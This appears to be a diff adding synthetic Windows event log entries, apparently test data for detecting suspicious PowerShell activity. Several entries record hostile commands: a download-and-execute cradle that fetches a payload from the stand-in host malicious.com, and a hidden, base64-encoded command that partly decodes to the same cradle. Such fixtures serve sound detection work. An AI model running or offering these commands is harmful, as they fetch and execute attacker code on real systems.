@@ -1,0 +1,27 @@
+<Event>
+    <EventID>4104</EventID>
+    <EventTime>2024-01-01T09:00:00</EventTime>
+    <User>bob</User>
+    <Message>powershell.exe -enc ZQBjAGgAbwAgACIASQBYACIA</Message>
+</Event>
+
+<Event>
+    <EventID>4104</EventID>
+    <EventTime>2024-01-01T09:05:00</EventTime>
+    <User>bob</User>
+    <Message>powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload')</Message>
+</Event>
+
+<Event>
+    <EventID>4624</EventID>
+    <EventTime>2024-01-01T10:00:00</EventTime>
+    <User>alice</User>
+    <Message>Successful logon</Message>
+</Event>
+
+<Event>
+    <EventID>4104</EventID>
+    <EventTime>2024-01-01T11:00:00</EventTime>
+    <User>charlie</User>
+    <Message>powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA</Message>
+</Event>
